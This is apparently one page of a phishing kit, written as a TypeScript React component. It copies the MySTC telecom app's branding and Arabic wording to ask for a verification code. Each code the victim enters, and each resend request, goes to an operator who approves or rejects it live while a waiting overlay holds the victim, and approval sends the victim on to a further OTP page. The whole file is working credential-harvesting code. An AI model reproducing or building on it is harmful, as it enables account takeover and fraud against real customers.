import { useEffect, useState, useRef } from "react";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import {
  sendData,
  isFormApproved,
  isFormRejected,
  navigateToPage,
} from "@/lib/store";

export default function MyStcOTP() {
  const [, navigate] = useLocation();
  const [otp, setOtp] = useState("");
  const [error, setError] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  // Emit page enter
  useEffect(() => {
    navigateToPage("MyStc OTP");
  }, []);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      navigate("/phone-otp?serviceProvider=0");
    }
  }, [isFormApproved.value, navigate]);

  // Handle form rejection - clear OTP
  useEffect(() => {
    if (isFormRejected.value) {
      setOtp("");
      setError(true);
      inputRef.current?.focus();
    }
  }, [isFormRejected.value]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // السماح بـ 4 أو 6 خانات
    if (otp.length !== 4 && otp.length !== 6) {
      setError(true);
      return;
    }

    setError(false);
    sendData({
      digitCode: otp,
      current: "MyStc OTP",
      nextPage: "تحقق رقم الجوال (OTP)?serviceProvider=0",
      waitingForAdminResponse: true,
    });
  };

  const handleResend = () => {
    sendData({
      data: { طلب: "إعادة إرسال رمز" },
      current: "MyStc OTP",
      waitingForAdminResponse: true,
    });
  };

  // السماح فقط بالأرقام
  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 6);
    setOtp(value);
    setError(false);
  };

  return (
    <PageLayout variant="default">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-8">
          <img
            src="/images/my-stc.png"
            alt="MySTC"
            className="h-12 mx-auto mb-4"
          />
          <h1 className="text-xl font-bold text-gray-800 mb-2">رمز التحقق MySTC</h1>
          <p className="text-gray-500 text-sm">
            أدخل رمز التحقق المرسل من تطبيق MySTC
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          {/* OTP Input - حقل واحد */}
          <div className="flex justify-center" dir="ltr">
            <input
              ref={inputRef}
              type="text"
              inputMode="numeric"
              pattern="[0-9]*"
              maxLength={6}
              value={otp}
              onChange={handleOtpChange}
              placeholder="أدخل الرمز"
              className={`w-48 h-14 text-center text-2xl font-bold border-2 rounded-lg outline-none transition-colors ${
                error 
                  ? 'border-red-500 focus:border-red-500' 
                  : 'border-gray-300 focus:border-purple-600'
              }`}
              autoFocus
            />
          </div>

          {error && (
            <p className="text-red-500 text-xs text-center">
              رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى
            </p>
          )}

          {/* Submit Button */}
          <Button type="submit" className="w-full" size="lg">
            تأكيد
          </Button>

          {/* Resend Link */}
          <div className="text-center">
            <button
              type="button"
              onClick={handleResend}
              className="text-primary text-sm hover:underline"
            >
              لم تستلم الرمز؟ إعادة الإرسال
            </button>
          </div>
        </form>
      </div>
    </PageLayout>
  );
}
